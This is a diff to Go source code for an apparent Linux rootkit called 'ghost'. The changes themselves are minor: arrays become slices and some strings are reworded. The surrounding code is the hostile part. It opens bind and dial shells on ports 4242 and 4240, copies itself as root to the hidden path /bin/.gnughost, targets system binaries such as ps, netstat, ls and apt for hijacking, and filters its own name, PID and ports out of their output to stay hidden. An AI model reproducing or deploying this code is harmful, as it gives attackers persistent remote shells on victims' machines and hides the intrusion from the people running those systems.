@@ -97,7 +97,7 @@ func bind(port int) {
 		}
 		// Start a goroutine to handle any connections
 		go session(c)
-		ghostsay("That's interesting...")
+		ghostsay("\nThat's interesting...\n")
 	}
 }
 
@@ -126,8 +126,8 @@ func possess() {
 		log.Fatal("possess requires root.")
 	}
 	ghostpath := "/bin/.gnughost"
-	//targets := [2]string{"/bin/ps", "/bin/netstat"}
-	targets := [6]string{"/bin/ls","/bin/cp","/bin/apt","/bin/who", "/bin/netstat", "/bin/ps"}
+	//targets := []string{"/bin/ps", "/bin/netstat"}
+	targets := []string{"/bin/ls","/bin/cp","/bin/apt","/bin/who", "/bin/netstat", "/bin/ps"}
 	
 	// Copy Ghost to ghostpath if not there already
 	if _, e := os.Stat(ghostpath); os.IsNotExist(e) {
@@ -176,7 +176,7 @@ func pretend(exe string, args []string) {
 	out := strings.Split(string(raw), "\n")
 	
 	// Patterns to filter out
-	patterns := [4]string{"ghost", string(os.Getpid()), "4242", "2424"}
+	patterns := []string{"ghost", string(os.Getpid()), "4242", "2424"}
 	for _, line := range out {
 		safe := true
 		for _, p := range patterns {
@@ -209,7 +209,7 @@ func main() {
 			dial(os.Args[i+1], port)
 			i += 2
 			case "--bind": // --bind
-			// Use port 4242 for root shells and 4240 otherwise
+			// Use port 4242 if root and 4240 otherwise
 			port := 4242
 			if os.Getuid() != 0 {
 				port = 4240
